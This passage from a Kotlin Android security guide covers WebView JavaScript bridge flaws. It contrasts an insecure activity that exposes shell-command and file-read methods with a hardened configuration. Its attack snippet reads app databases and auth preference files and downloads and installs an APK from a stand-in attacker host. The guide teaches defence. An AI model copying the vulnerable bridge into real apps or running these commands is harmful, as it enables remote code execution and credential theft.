---
source: "languages/kotlin/android-security-deep.md"
title: "Android Security Deep Dive"
heading: "3. WebView JavaScript Bridge"
category: "language-vuln"
language: "kotlin"
severity: "medium"
tags: [content, intent, interception, javascript, kotlin, language-vuln, overview, provider, table, webview]
chunk: 6/9
---

## 3. WebView JavaScript Bridge

The WebView JavaScript bridge (`addJavascriptInterface`) allows JavaScript in a WebView to call Java/Kotlin methods. If the WebView loads untrusted content, an attacker can call arbitrary exposed methods — a classic RCE vector.

### Vulnerable WebView with JavaScript Interface

```kotlin
// VULNERABLE: Exposed JS bridge loading untrusted content
class InsecureWebViewActivity : AppCompatActivity() {
    
    private lateinit var webView: WebView
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)
        
        webView = findViewById(R.id.webView)
        webView.settings.apply {
            javaScriptEnabled = true  // Required for bridge
            allowFileAccess = true    // VULNERABLE: file:// access
            allowContentAccess = true // VULNERABLE: content:// access
        }
        
        // VULNERABLE: Exposed interface with dangerous methods
        webView.addJavascriptInterface(this, "AndroidBridge")
        
        // Loading untrusted URL
        webView.loadUrl(intent.getStringExtra("url") ?: "about:blank")
    }
    
    @JavascriptInterface
    fun executeCommand(command: String): String {
        // VULNERABLE: Executes arbitrary shell commands!
        return Runtime.getRuntime().exec(command).inputStream.reader().readText()
    }
    
    @JavascriptInterface
    fun readFile(path: String): String {
        // VULNERABLE: Reads any file!
        return File(path).readText()
    }
}
```

### Attack from WebView

```javascript
// Malicious JavaScript in WebView exploits bridge
// This can be injected through any XSS or loaded URL
AndroidBridge.executeCommand("cat /data/data/com.example/databases/secret.db");
AndroidBridge.readFile("/data/data/com.example/shared_prefs/auth.xml");

// Or escalate: install backdoor
AndroidBridge.executeCommand("curl http://attacker.com/malware.apk -o /tmp/malware.apk && pm install /tmp/malware.apk");
```

### Secure WebView Configuration

```kotlin
// SECURE: WebView with minimized attack surface
class SecureWebViewActivity : AppCompatActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)
        
        val webView = findViewById<WebView>(R.id.webView)
        webView.settings.apply {
            javaScriptEnabled = true
            
            // Disable dangerous features
            allowFileAccess = false
            allowContentAccess = false
            allowFileAccessFromFileURLs = false
            allowUniversalAccessFromFileURLs = false
            
            // Secure storage
            databaseEnabled = false
            domStorageEnabled = true  // Only if needed
            
            // Mixed content
            mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
        }
        
        // SECURE: Use a narrow, safe interface
        webView.addJavascriptInterface(
            SecureBridge(this), "SecureBridge"
        )
        
        // Only load HTTPS content
        val url = intent.getStringExtra("url") ?: return
        if (URLUtil.isNetworkUrl(url) && url.startsWith("https://")) {
            webView.loadUrl(url)
        }
    }
    
    // SECURE: Minimal, validated bridge interface
    class SecureBridge(private val context: Context) {
        
        private val allowedHosts = setOf("app.example.com", "api.example.com")
        
        @JavascriptInterface
        fun getDisplayTheme(): String {
            // Only return safe, pre-defined values
            return if (isDarkModeEnabled()) "dark" else "light"
        }
        
        @JavascriptInterface
        fun getStoredString(key: String): String? {
            // Validate the key against allowlist
            if (key !in setOf("user_display_name", "language_pref", "ui_size")) {
                return null
            }
            
            val prefs = context.getSharedPreferences("web_prefs", Context.MODE_PRIVATE)
            return prefs.getString(key, null)
        }
        
        // NO executeCommand, NO file read, NO database access!
    }
}
```

---